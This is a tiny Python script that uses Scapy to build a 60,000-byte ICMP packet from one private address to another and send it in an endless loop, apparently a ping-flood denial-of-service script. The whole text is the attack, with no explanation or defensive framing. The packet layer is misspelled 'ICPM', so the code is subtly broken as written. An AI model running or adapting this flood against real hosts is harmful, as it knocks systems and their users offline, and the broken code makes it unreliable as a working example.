from scapy.all import *

ip1 = IP(src="10.133.1.181",dst="10.133.1.153")
packet = ip1/ICPM()/("m"*60000)
while True:
  send(packet)
